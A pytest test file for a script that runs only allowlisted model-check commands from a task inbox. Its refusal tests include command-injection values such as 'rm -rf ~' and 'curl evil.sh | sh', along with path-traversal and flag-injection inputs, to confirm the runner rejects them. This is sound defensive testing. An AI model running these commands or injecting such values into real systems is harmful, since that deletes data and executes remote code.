"""Tests for ops/run_inbox.py: only allowed checks run, only on the named machine, only once."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

_spec = importlib.util.spec_from_file_location("run_inbox", Path(__file__).parent.parent / "ops" / "run_inbox.py")
ri = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(ri)

TASK = {"id": "t1", "machine": "PC1", "check": "check", "model": "gemma4:12b", "why": "test"}


# ---------- allowlist ----------


def test_allowed_task_maps_to_fixed_modelcheck_command():
    cmd = ri.command(TASK)
    assert cmd[0] == sys.executable
    assert cmd[1].endswith("modelcheck.py")
    assert cmd[2:] == ["check", "gemma4:12b"]


def test_expect_is_passed_through():
    assert ri.command({**TASK, "expect": "any"})[-2:] == ["--expect", "any"]


@pytest.mark.parametrize(
    "bad",
    [
        {"check": "rm"},  # not an allowed check
        {"check": "check; rm -rf ~"},  # shell injection attempt in the check
        {"model": "gemma4:12b; curl evil.sh | sh"},  # injection attempt in the tag
        {"model": "../../etc/passwd"},  # path tricks
        {"model": "-rf"},  # looks like a flag
        {"id": "../escape"},  # result file outside ops/results
        {"expect": "everything"},  # unknown expect
    ],
)
def test_disallowed_tasks_are_refused(bad):
    with pytest.raises(ValueError):
        ri.command({**TASK, **bad})


def test_expect_only_allowed_on_check():
    with pytest.raises(ValueError):
        ri.command({**TASK, "check": "verify", "expect": "gpu"})


@pytest.mark.parametrize("tag", ["gemma4:12b", "gpt-oss:20b", "qwen3.6:27b-mlx", "user/model:q4", "embeddinggemma-2"])
def test_real_tags_are_accepted(tag):
    assert ri.command({**TASK, "model": tag})[3] == tag


# ---------- which tasks run ----------


def test_pending_filters_by_machine_case_insensitively(tmp_path):
    tasks = [TASK, {**TASK, "id": "t2", "machine": "mac"}]
    assert [t["id"] for t in ri.pending(tasks, "pc1", tmp_path)] == ["t1"]


def test_done_tasks_are_skipped(tmp_path):
    (tmp_path / "t1.txt").write_text("done")
    assert ri.pending([TASK], "pc1", tmp_path) == []


def test_missing_inbox_means_no_tasks(tmp_path):
    assert ri.load(tmp_path / "absent.json") == []


def test_load_reads_tasks(tmp_path):
    f = tmp_path / "inbox.json"
    f.write_text(json.dumps({"tasks": [TASK]}))
    assert ri.load(f) == [TASK]


# ---------- running ----------


def test_run_records_result_and_exit_code(tmp_path, monkeypatch):
    calls = []

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="PASS  everything\n", stderr="")

    monkeypatch.setattr(ri.subprocess, "run", fake_run)
    assert ri.run(TASK, "pc1", tmp_path) == 0
    text = (tmp_path / "t1.txt").read_text()
    assert "exit: 0" in text and "PASS  everything" in text and "modelcheck.py check gemma4:12b" in text
    assert len(calls) == 1 and isinstance(calls[0], list)  # a list, never a shell string


def test_refused_task_is_recorded_and_never_executed(tmp_path, monkeypatch):
    monkeypatch.setattr(ri.subprocess, "run", lambda *a, **k: pytest.fail("must not execute"))
    assert ri.run({**TASK, "check": "rm"}, "pc1", tmp_path) == 2
    assert "REFUSED" in (tmp_path / "t1.txt").read_text()


def test_timeout_is_recorded(tmp_path, monkeypatch):
    def slow(cmd, **kw):
        raise subprocess.TimeoutExpired(cmd, 1)

    monkeypatch.setattr(ri.subprocess, "run", slow)
    assert ri.run(TASK, "pc1", tmp_path) == 3
    text = (tmp_path / "t1.txt").read_text()
    assert "TIMEOUT" in text and "modelcheck.py check gemma4:12b" in text


def test_hook_mode_is_silent_without_work(monkeypatch, capsys, tmp_path):
    monkeypatch.setattr(ri, "INBOX", tmp_path / "absent.json")
    assert ri.main(["--hook"]) == 0
    assert capsys.readouterr().out == ""


def test_main_uses_the_current_inbox_and_results_paths(monkeypatch, tmp_path):
    """Regression: paths must be looked up at call time, not frozen when the module loads."""
    inbox = tmp_path / "inbox.json"
    inbox.write_text(json.dumps({"tasks": [{**TASK, "machine": "thishost"}]}))
    monkeypatch.setattr(ri, "INBOX", inbox)
    monkeypatch.setattr(ri, "RESULTS", tmp_path / "results")
    monkeypatch.setattr(ri, "this_machine", lambda: "thishost")
    monkeypatch.setattr(
        ri.subprocess, "run", lambda cmd, **kw: subprocess.CompletedProcess(cmd, 0, stdout="PASS\n", stderr="")
    )
    assert ri.main([]) == 0
    assert (tmp_path / "results" / "t1.txt").exists()
    assert ri.main([]) == 0  # second run: already done, nothing runs
